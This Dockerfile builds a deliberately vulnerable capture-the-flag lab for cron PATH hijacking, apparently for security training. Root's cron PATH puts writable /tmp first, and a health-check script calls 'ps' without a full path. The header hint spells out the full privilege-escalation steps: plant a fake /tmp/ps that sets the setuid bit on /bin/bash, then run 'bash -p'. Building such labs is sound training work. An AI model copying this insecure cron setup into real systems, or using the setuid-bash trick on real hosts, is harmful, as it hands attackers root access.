FROM ubuntu:20.04

# ─────────────────────────────────────────────
# Lab 07 · Cron PATH hijacking
# Goal    : Root's cron job runs /opt/syscheck.sh
#           which calls 'ps' without a full path.
#           The cron PATH includes /tmp (writable).
#           Plant a fake 'ps' there to escalate.
# Hint    :
#   cat /etc/cron.d/syscheck     → see PATH= line
#   cat /opt/syscheck.sh         → calls 'ps'
#   echo '#!/bin/bash\nchmod +s /bin/bash' > /tmp/ps
#   chmod +x /tmp/ps
#   wait ~60 s then: /bin/bash -p
# ─────────────────────────────────────────────

ENV DEBIAN_FRONTEND=noninteractive

RUN apt-get update -qq && \
    apt-get install -y --no-install-recommends openssh-server cron procps && \
    rm -rf /var/lib/apt/lists/*

RUN useradd -m -s /bin/bash wocsa && echo "wocsa:YdcjoXU8SVoR" | chpasswd

RUN echo "WOCSA{cron_path_hijack_pwnd}" > /root/flag.txt && \
    chmod 600 /root/flag.txt

# The script root's cron calls — uses relative 'ps' command
RUN cat > /opt/syscheck.sh << 'EOF'
#!/bin/bash
# System health check — do not modify
TIMESTAMP=$(date '+%Y-%m-%d %H:%M:%S')
echo "[$TIMESTAMP] Check started" >> /var/log/syscheck.log
ps aux >> /var/log/syscheck.log
echo "[$TIMESTAMP] Check done" >> /var/log/syscheck.log
EOF
RUN chmod 755 /opt/syscheck.sh
RUN touch /var/log/syscheck.log && chmod 644 /var/log/syscheck.log

# VULNERABILITY: PATH includes /tmp before system paths
RUN printf 'PATH=/tmp:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\n' \
        > /etc/cron.d/syscheck && \
    printf '* * * * * root /opt/syscheck.sh\n' >> /etc/cron.d/syscheck && \
    chmod 644 /etc/cron.d/syscheck

RUN echo "=== Lab 07: Cron PATH hijack ===" > /home/wocsa/README.txt && \
    echo "A root cron job runs /opt/syscheck.sh every minute." >> /home/wocsa/README.txt && \
    echo "Look at the PATH set in /etc/cron.d/syscheck." >> /home/wocsa/README.txt && \
    echo "Look at what commands syscheck.sh calls without full paths." >> /home/wocsa/README.txt && \
    echo "Goal: read /root/flag.txt" >> /home/wocsa/README.txt && \
    chown wocsa:wocsa /home/wocsa/README.txt

COPY entrypoint.sh /entrypoint.sh
RUN chmod +x /entrypoint.sh
ENTRYPOINT ["/entrypoint.sh"]
